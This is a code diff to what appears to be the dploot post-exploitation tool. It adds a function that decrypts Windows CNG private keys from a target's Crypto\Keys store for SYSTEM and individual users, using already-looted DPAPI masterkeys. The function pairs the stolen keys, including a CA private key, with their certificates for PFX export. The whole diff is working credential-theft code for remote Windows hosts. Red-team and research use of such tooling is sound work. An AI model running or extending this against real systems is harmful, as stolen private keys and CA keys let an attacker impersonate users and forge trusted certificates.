@@ -6,7 +6,7 @@ from dataclasses import dataclass
 
 from Cryptodome.PublicKey import RSA
 from cryptography import x509
-from cryptography.hazmat._oid import ExtensionOID
+from cryptography.hazmat._oid import ExtensionOID, NameOID
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
 from cryptography.hazmat.primitives.serialization import (
@@ -97,6 +97,9 @@ class CertificatesTriage(Triage):
     def triage_system_certificates(self) -> List[Certificate]:
         certificates = []
         pkeys = self.loot_privatekeys()
+        # CNG keys (ProgramData\Microsoft\Crypto\Keys) back CA and other certs
+        # whose private key is not a legacy CAPI key.
+        pkeys.update(self.loot_cng_privatekeys(winuser="SYSTEM"))
         logging.debug(f"Got {len(pkeys)} private key(s).")
         # stop here if no private key has been found.
         if not pkeys:
@@ -147,6 +150,7 @@ class CertificatesTriage(Triage):
         pkeys = self.loot_privatekeys(
             privatekeys_paths=[elem % user for elem in self.user_capi_keys_generic_path]
         )
+        pkeys.update(self.loot_cng_privatekeys(winuser=user))
         certs = self.loot_certificates(
             certificates_paths=[
                 elem % user for elem in self.user_mycertificates_generic_path
@@ -211,6 +215,49 @@ class CertificatesTriage(Triage):
                                         logging.debug(
                                             f"Exception encountered in {__name__}: {e}."
                                         )
+        return pkeys
+
+    def loot_cng_privatekeys(
+        self, winuser: str = "SYSTEM"
+    ) -> Dict[str, Tuple[str, RSA.RsaKey]]:
+        """Decrypt CNG (``Crypto\\Keys``) RSA private keys for correlation.
+
+        Returns a dict keyed by the MD5 of the DER-encoded public key, matching
+        the scheme used by :meth:`loot_privatekeys`, so CNG-backed keys (e.g. a
+        CA private key) can be paired with their certificate and exported to PFX.
+        """
+        from dploot.triage.cng import CngTriage
+
+        pkeys = {}
+        if self.masterkeys is None:
+            return pkeys
+        try:
+            cng_triage = CngTriage(
+                target=self.target,
+                conn=self.conn,
+                masterkeys=self.masterkeys,
+                false_positive=self.false_positive,
+            )
+            if winuser == "SYSTEM":
+                cng_files = cng_triage.triage_system_cng()
+            else:
+                cng_files = cng_triage.triage_cng_for_user(winuser)
+            # carry any looted CNG files through for --export-dir dumping
+            self.looted_files.update(cng_triage.looted_files)
+        except Exception as e:
+            logging.debug(f"Exception while triaging CNG keys in {__name__}: {e}")
+            return pkeys
+
+        for cng_file in cng_files:
+            if cng_file.decrypted_private_key_pem is None:
+                continue
+            try:
+                pkey = RSA.import_key(cng_file.decrypted_private_key_pem)
+                pkeys[
+                    hashlib.md5(pkey.public_key().export_key("DER")).hexdigest()
+                ] = (cng_file.key_name, pkey)
+            except Exception as e:
+                logging.debug(f"Exception while importing CNG RSA key: {e}")
         return pkeys
 
     def loot_certificates(
@@ -330,6 +377,15 @@ class CertificatesTriage(Triage):
 
             for name in san.value.get_values_for_type(x509.DNSName):
                 return "DNS Host Name", name
+        except Exception:
+            pass
+
+        # No usable SAN (e.g. a CA certificate): fall back to the subject CN so
+        # the identity/filename is still meaningful.
+        try:
+            cn = certificate.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
+            if cn:
+                return "Subject CN", cn[0].value
         except Exception:
             pass
 
